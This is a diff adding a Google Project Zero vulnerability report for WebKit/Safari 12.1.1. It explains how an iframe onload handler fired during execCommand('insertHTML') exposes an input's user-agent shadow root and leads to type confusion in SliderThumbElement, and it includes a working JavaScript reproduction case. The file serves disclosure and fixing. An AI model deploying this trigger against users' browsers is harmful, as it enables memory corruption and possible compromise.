@@ -1,0 +1,93 @@
+<!--
+VULNERABILITY DETAILS
+editing/ReplaceSelectionCommnd.cpp:
+```
+Ref<HTMLElement> ReplacementFragment::insertFragmentForTestRendering(Node* rootEditableElement)
+{
+    auto holder = createDefaultParagraphElement(document());
+
+    holder->appendChild(*m_fragment);
+    rootEditableElement->appendChild(holder); // ***2***
+    document().updateLayoutIgnorePendingStylesheets();
+
+    return holder;
+}
+
+[...]
+
+ReplacementFragment::ReplacementFragment(Document& document, DocumentFragment* fragment, const VisibleSelection& selection)
+    : m_document(&document)
+    , m_fragment(fragment)
+    , m_hasInterchangeNewlineAtStart(false)
+    , m_hasInterchangeNewlineAtEnd(false)
+{
+    if (!m_fragment)
+        return;
+    if (!m_fragment->firstChild())
+        return;
+    
+    RefPtr<Element> editableRoot = selection.rootEditableElement(); // ***1***
+    ASSERT(editableRoot);
+    if (!editableRoot)
+        return;   
+[...]
+    RefPtr<StyledElement> holder = insertFragmentForTestRendering(editableRoot.get());
+```
+
+html/shadow/SliderThumbElement.cpp
+```
+RefPtr<HTMLInputElement> SliderThumbElement::hostInput() const
+{
+    // Only HTMLInputElement creates SliderThumbElement instances as its shadow nodes.
+    // So, shadowHost() must be an HTMLInputElement.
+    return downcast<HTMLInputElement>(shadowHost()); // ***3***
+}
+```
+
+I noticed this behavior when I was debugging the test case for
+https://bugs.webkit.org/show_bug.cgi?id=199146. When the currently focused element is an <input>,
+`selection.rootEditableElement()` in [1] might point to a node inside the <input>'s user-agent
+shadow DOM tree. Then `insertFragmentForTestRendering` is called, which might have side effects,
+e.g., if the inserted fragment contains an <iframe> element its "onload" handler will be called
+synchronously, and it's possible to reach the user-agent shadow root object by following the
+ancestor chain from the <iframe>.
+
+When an attacker has access to the shadow root, she can use it to leak other elements that are only
+intended for internal use and have less strict security checks. For example, `SliderThumbElement`
+doesn't check that its host element is an <iframe> in [3], so the attacker can turn this bug into a
+type confusion vulnerability.
+
+
+VERSION
+WebKit revision 246194
+Safari version 12.1.1 (14607.2.6.1.1)
+
+
+REPRODUCTION CASE
+-->
+
+<body>
+<script>
+input = document.body.appendChild(document.createElement('input'));
+input.focus();
+handler = event => {
+  shadow_root = event.target.parentNode.parentNode.parentNode;
+  input.type = 'range';
+  elt = shadow_root.firstChild.firstChild.firstChild;
+  input.remove();
+  elt.remove();
+  evt = new MouseEvent('mouseup');
+  div = document.createElement('div');
+  new_shadow_root = div.attachShadow({mode: 'open'});
+  new_shadow_root.appendChild(elt);
+  elt.dispatchEvent(evt);
+}
+document.execCommand('insertHTML', false, '<iframe src="about:blank" onload="handler(event)"></iframe>');
+</script>
+</body>
+
+
+<!--
+CREDIT INFORMATION
+Sergei Glazunov of Google Project Zero
+-->
